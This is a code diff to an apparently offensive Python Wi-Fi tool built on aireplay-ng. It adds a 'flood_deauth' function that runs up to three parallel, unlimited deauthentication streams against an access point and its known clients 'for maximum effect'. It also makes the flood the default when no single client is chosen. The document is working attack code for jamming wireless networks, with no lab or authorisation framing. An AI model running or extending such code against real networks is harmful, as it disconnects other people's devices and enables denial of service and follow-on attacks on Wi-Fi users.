@@ -50,11 +50,7 @@ def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, c
     cmd.append(mon_iface)
 
     target = client_mac if client_mac else "broadcast (all clients)"
-    print(f"\n[*] Sending deauth → AP: {bssid}  Target: {target}")
-    if continuous:
-        print("[*] Continuous mode — press Ctrl+C to stop")
-    else:
-        print(f"[*] Sending {count} deauth packets...")
+    print(f"[*] Deauth flood → {bssid}  target: {target}  [Ctrl+C to stop]")
 
     proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True)
@@ -65,14 +61,13 @@ def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, c
             line = line.strip()
             if not line:
                 continue
-            # aireplay-ng prints one line per sent frame
             if "Sending DeAuth" in line or "Sending DeAuthentication" in line:
                 frames_sent += 1
-                print(f"\r[*] Deauth frames sent: {frames_sent}", end="", flush=True)
+                print(f"\r[*] Frames: {frames_sent}", end="", flush=True)
             elif "Waiting for beacon" in line:
                 print(f"    {line}")
             elif "more effective" in line or "connected wireless" in line:
-                pass  # suppress hint noise
+                pass
             else:
                 print(f"    {line}")
         proc.wait()
@@ -83,8 +78,56 @@ def send_deauth(mon_iface, bssid, client_mac=None, count=10, continuous=False, c
         except Exception:
             proc.kill()
 
-    print(f"\n[+] Done. Sent {frames_sent} deauth frames to {bssid}")
+    print(f"\n[+] Done. Sent {frames_sent} deauth frames")
     return frames_sent
+
+
+def flood_deauth(mon_iface, bssid, channel, clients=None):
+    """
+    Flood deauth: 3 parallel aireplay-ng processes for maximum effect.
+    - 1 broadcast process
+    - 1 process per known client (up to 2)
+    Press Ctrl+C to stop all.
+    """
+    if channel:
+        subprocess.run(["iw", "dev", mon_iface, "set", "channel", str(channel)],
+                       capture_output=True, timeout=5)
+        print(f"[*] Channel {channel}")
+
+    procs = []
+
+    # broadcast process
+    cmd_bc = ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface]
+    procs.append(subprocess.Popen(cmd_bc, stdout=subprocess.DEVNULL,
+                                   stderr=subprocess.DEVNULL))
+
+    # per-client processes (up to 2 known clients)
+    for c in (clients or [])[:2]:
+        cmd_c = ["aireplay-ng", "--deauth", "0", "-a", bssid,
+                 "-c", c["mac"], mon_iface]
+        procs.append(subprocess.Popen(cmd_c, stdout=subprocess.DEVNULL,
+                                       stderr=subprocess.DEVNULL))
+
+    n = len(procs)
+    print(f"[*] Running {n} deauth stream(s) → {bssid}  [Ctrl+C to stop]")
+
+    frames = 0
+    try:
+        while True:
+            time.sleep(0.5)
+            frames += 1
+            print(f"\r[*] Running... {frames}s", end="", flush=True)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        for p in procs:
+            try:
+                p.send_signal(signal.SIGINT)
+                p.wait(timeout=2)
+            except Exception:
+                p.kill()
+
+    print(f"\n[+] Stopped after {frames}s")
 
 
 def deauth_menu(aps, clients, mon_iface):
@@ -139,10 +182,15 @@ def deauth_menu(aps, clients, mon_iface):
 
     bssid = ap["bssid"]
     essid = ap["essid"] or "<hidden>"
-    target_str = client_mac if client_mac else "all clients"
-    print(f"\n[!] Deauth {essid} ({bssid}) → {target_str}  [Ctrl+C to stop]")
-    send_deauth(mon_iface, bssid, client_mac, count=0, continuous=True,
-                channel=ap.get("channel"))
+    ap_clients = [c for c in clients if c["bssid"] == bssid]
+
+    if client_mac:
+        print(f"\n[!] Deauth {essid} → {client_mac}  [Ctrl+C to stop]")
+        send_deauth(mon_iface, bssid, client_mac, count=0, continuous=True,
+                    channel=ap.get("channel"))
+    else:
+        print(f"\n[!] Flood deauth {essid} ({bssid})  [Ctrl+C to stop]")
+        flood_deauth(mon_iface, bssid, ap.get("channel"), ap_clients)
 
 
 def interactive_deauth():
